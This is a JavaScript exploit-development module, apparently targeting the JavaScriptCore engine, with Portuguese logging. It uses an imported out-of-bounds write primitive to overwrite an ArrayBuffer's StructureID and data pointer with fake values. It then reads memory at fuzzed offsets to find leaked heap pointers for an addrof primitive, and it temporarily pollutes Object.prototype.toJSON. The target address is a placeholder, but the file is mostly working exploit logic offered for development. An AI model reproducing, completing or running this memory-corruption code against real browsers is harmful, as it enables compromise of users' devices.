// js/script3/testArrayBufferVictimCrash.mjs (v74_AnalyzeCoreExploitConfusedABMemory)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_read_absolute,
    oob_write_absolute,
    clearOOBEnvironment,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM = "OriginalHeisenbug_TypedArrayAddrof_v74_AnalyzeCoreExploitConfusedABMemory";

let probe_call_count_v74 = 0;
let all_probe_interaction_details_v74 = [];

const HEISENBUG_VICTIM_AB_SIZE_FOR_CORRUPTION = 64;
const PROBE_CALL_LIMIT_V74 = 5;
const FUZZ_OFFSETS_V74 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50];


function toJSON_TA_Probe_Placeholder_v74() {
    probe_call_count_v74++;
    const call_num = probe_call_count_v74;
    const this_obj_type = Object.prototype.toString.call(this);
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM,
        this_type: this_obj_type,
        info: "Placeholder probe call for dummy stringify"
    };
    logS3(`[${current_call_details.probe_variant}-Probe] Call #${call_num}. Type: ${this_obj_type}.`, "leak");
    all_probe_interaction_details_v74.push(current_call_details);
    if (call_num > PROBE_CALL_LIMIT_V74) return { recursion_stopped: true };
    return { call_num_processed: call_num, type: this_obj_type };
}

export async function executeTypedArrayVictimAddrofTest_AnalyzeCoreExploitConfusedABMemory() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Analyzing ArrayBuffer explicitly corrupted by core_exploit's logic ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM} Init...`;

    probe_call_count_v74 = 0;
    all_probe_interaction_details_v74 = []; // Resetar antes de usar
    let collected_probe_details_for_return = [];

    let errorCapturedMain = null;
    let addrof_A_result = { success: false, msg: "Addrof CorruptedAB: Default (v74)" };

    const OFFSET_STRUCTURE_ID = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
    const OFFSET_BUTTERFLY_DATA_FIELD = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
    const FAKE_STRUCTURE_ID_VAL_STR = JSC_OFFSETS.Structure.GENERIC_OBJECT_FAKE_ID_VALUE_FOR_CONFUSION;
    const FAKE_BUTTERFLY_DATA_VAL_STR = JSC_OFFSETS.ArrayBuffer.BUTTERFLY_OR_DATA_FAKE_VALUE_FOR_CONFUSION;

    let fake_struct_id_adv64;
    let fake_butterfly_adv64;

    try {
        // CORREÇÃO: Usar o construtor diretamente
        fake_struct_id_adv64 = new AdvancedInt64(FAKE_STRUCTURE_ID_VAL_STR);
        fake_butterfly_adv64 = new AdvancedInt64(FAKE_BUTTERFLY_DATA_VAL_STR);
        logS3(`  Fake StructureID for corruption: ${fake_struct_id_adv64.toString(true)}`, "info", FNAME_CURRENT_TEST);
        logS3(`  Fake Butterfly/Data for corruption: ${fake_butterfly_adv64.toString(true)}`, "info", FNAME_CURRENT_TEST);
    } catch (e_adv64) {
        logS3(`ERRO CRÍTICO ao criar AdvancedInt64 a partir de strings hex: ${e_adv64.message}`, "critical", FNAME_CURRENT_TEST);
        addrof_A_result.msg = `V74 ERRO: Falha ao parsear constantes hex para AdvancedInt64: ${e_adv64.message}`;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}: HexParse ERR`;
        // Retornar imediatamente se as constantes não puderem ser parseadas
        return {
            errorCapturedMain: e_adv64, stringifyResult: null, rawStringifyForAnalysis: null,
            all_probe_calls_for_analysis: [], total_probe_calls: 0,
            addrof_A_result: addrof_A_result, addrof_B_result: {success:false, msg:"N/A for v74"}
        };
    }

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;

    try {
        await triggerOOB_primitive({ force_reinit: true });

        let target_ab_to_corrupt = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE_FOR_CORRUPTION);
        let dv_on_target_ab = new DataView(target_ab_to_corrupt);
        logS3(`  ArrayBuffer alvo (tamanho ${HEISENBUG_VICTIM_AB_SIZE_FOR_CORRUPTION}) criado para corrupção.`, "info", FNAME_CURRENT_TEST);

        let address_of_target_ab_cell = 0xBADADD00; // !! PLACEHOLDER !!
        logS3(`  ASSUMINDO endereço da JSCell do target_ab_to_corrupt: ${toHex(address_of_target_ab_cell, 64)}. (Este é um placeholder!)`, "warn", FNAME_CURRENT_TEST);

        if (address_of_target_ab_cell === 0xBADADD00 || address_of_target_ab_cell === 0) {
             addrof_A_result.msg = "V74 FALHA CRÍTICA: Endereço da JSCell do AB alvo não obtido/simulado.";
             logS3(addrof_A_result.msg, "error", FNAME_CURRENT_TEST);
        } else {
            logS3(`  Corrompendo metadados do target_ab_to_corrupt em ${toHex(address_of_target_ab_cell, 64)}...`, "info", FNAME_CURRENT_TEST);
            oob_write_absolute(address_of_target_ab_cell + OFFSET_STRUCTURE_ID, fake_struct_id_adv64.low(), 4);
            oob_write_absolute(address_of_target_ab_cell + OFFSET_STRUCTURE_ID + 4, fake_struct_id_adv64.high(), 4);
            logS3(`    Escrito fake StructureID ${fake_struct_id_adv64.toString(true)} em +${toHex(OFFSET_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);

            oob_write_absolute(address_of_target_ab_cell + OFFSET_BUTTERFLY_DATA_FIELD, fake_butterfly_adv64.low(), 4);
            oob_write_absolute(address_of_target_ab_cell + OFFSET_BUTTERFLY_DATA_FIELD + 4, fake_butterfly_adv64.high(), 4);
            logS3(`    Escrito fake Butterfly/Data ${fake_butterfly_adv64.toString(true)} em +${toHex(OFFSET_BUTTERFLY_DATA_FIELD)}`, "info", FNAME_CURRENT_TEST);

            await PAUSE_S3(100);

            logS3(`  Lendo campos do target_ab_to_corrupt (via DataView no seu buffer) APÓS corrupção...`, "info", FNAME_CURRENT_TEST);
            let fuzzed_reads = [];
            for (const offset of FUZZ_OFFSETS_V74) { // Renomeado para V74
                let low=0, high=0, ptr_str="N/A", dbl=NaN, err_msg=null;
                if (dv_on_target_ab.byteLength < (offset + 8)) { err_msg = "OOB"; fuzzed_reads.push({ offset: toHex(offset), error: err_msg }); }
                else { low=dv_on_target_ab.getUint32(offset,true); high=dv_on_target_ab.getUint32(offset+4,true); ptr_str=new AdvancedInt64(low,high).toString(true); let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high; dbl=(new Float64Array(tb))[0]; fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); }
                logS3(`    CorruptedAB Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`, "dev_verbose");
            }

            for (const r of fuzzed_reads) {
                if (r.error) continue;
                if (r.offset === toHex(OFFSET_STRUCTURE_ID) && r.int64 === fake_struct_id_adv64.toString(true)) {
                    logS3(`  !!!! V74 VERIFICADO: Fake StructureID ${r.int64} lido de volta do offset ${r.offset} !!!!`, "vuln");
                    if (!addrof_A_result.msg.includes("VERIFICADO")) addrof_A_result.msg = ""; // Limpa default se algo for verificado
                    addrof_A_result.msg += `V74 Fake StructureID verificado em ${r.offset}. `;
                }
                if (r.offset === toHex(OFFSET_BUTTERFLY_DATA_FIELD) && r.int64 === fake_butterfly_adv64.toString(true)) {
                    logS3(`  !!!! V74 VERIFICADO: Fake Butterfly/Data ${r.int64} lido de volta do offset ${r.offset} !!!!`, "vuln");
                    if (!addrof_A_result.msg.includes("VERIFICADO")) addrof_A_result.msg = ""; // Limpa default
                    addrof_A_result.msg += `Fake Butterfly/Data verificado em ${r.offset}. `;
                }
                const hV=parseInt(r.high,16),lV=parseInt(r.low,16); let isPotentialPtr=false;
                if(JSC_OFFSETS.JSValue?.HEAP_POINTER_TAG_HIGH!==undefined && JSC_OFFSETS.JSValue?.TAG_MASK!==undefined && JSC_OFFSETS.JSValue?.CELL_TAG!==undefined){isPotentialPtr=(hV===JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH&&(lV&JSC_OFFSETS.JSValue.TAG_MASK)===JSC_OFFSETS.JSValue.CELL_TAG);}if(!isPotentialPtr&&(hV>0||lV>0x10000)&&(hV<0x000F0000)&&((lV&0x7)===0)){isPotentialPtr=true;}

                if(isPotentialPtr && !(hV === 0 && lV === 0) && r.int64 !== fake_struct_id_adv64.toString(true) && r.int64 !== fake_butterfly_adv64.toString(true) ){
                    addrof_A_result.success = true;
                    addrof_A_result.msg = `V74 SUCCESS (CorruptedAB Read): Potential Ptr ${r.int64} from offset ${r.offset}`;
                    logS3(`  !!!! V74 POTENTIAL POINTER FOUND in CorruptedAB at offset ${r.offset}: ${r.int64} !!!!`, "vuln");
                    break;
                }
            }
            if(!addrof_A_result.success && !addrof_A_result.msg.includes("verificado")){ addrof_A_result.msg = `V74 Reads from CorruptedAB did not yield pointer. First read @0x00: ${fuzzed_reads[0]?.int64 || 'N/A'}`; }
            else if (!addrof_A_result.success && addrof_A_result.msg.includes("verificado")) { addrof_A_result.msg += "Nenhum outro ponteiro encontrado.";}
        }

        let dummy_victim = new Uint8Array(new ArrayBuffer(16));
        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); // Salva o descritor original (pode ser null)
        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Placeholder_v74, writable: true, configurable: true, enumerable: false });
        pollutionApplied = true;
        logS3(`  Calling JSON.stringify on a dummy victim for flow continuation...`, "info", FNAME_CURRENT_TEST);
        JSON.stringify(dummy_victim);
        logS3(`  JSON.stringify on dummy victim completed.`, "info", FNAME_CURRENT_TEST);


        if (addrof_A_result.success) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}: Addr SUCCESS!`; }
        else if (addrof_A_result.msg.includes("verificado")) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}: Corruption OK, Addr Fail`; }
        else if (addrof_A_result.msg.includes("FALHA CRÍTICA")) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}: Critical Fail (AddrOf AB)`;}
        else { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM}: Addr Fail`; }

    } catch (e_overall_main) {
        errorCapturedMain = e_overall_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_overall_main.name} - ${e_overall_main.message}${e_overall_main.stack ? '\n'+e_overall_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_ACECABM} CRIT_ERR`;
    } finally {
        if (all_probe_interaction_details_v74 && Array.isArray(all_probe_interaction_details_v74)) {
            collected_probe_details_for_return = all_probe_interaction_details_v74.map(d => (d && typeof d === 'object' ? {...d} : d));
        } else {
            collected_probe_details_for_return = [];
        }
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
            else delete Object.prototype.toJSON;
            logS3(`  Object.prototype.toJSON restored after dummy stringify.`, "info", FNAME_CURRENT_TEST);
        }
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls (dummy): ${probe_call_count_v74}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof CorruptedAB: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
    }
    return {
        errorCapturedMain: errorCapturedMain, stringifyResult: null, rawStringifyForAnalysis: null,
        all_probe_calls_for_analysis: collected_probe_details_for_return,
        total_probe_calls: probe_call_count_v74,
        addrof_A_result: addrof_A_result,
        addrof_B_result: {success:false, msg:"N/A for v74"} // Não há alvo B direto nesta estratégia
    };
};
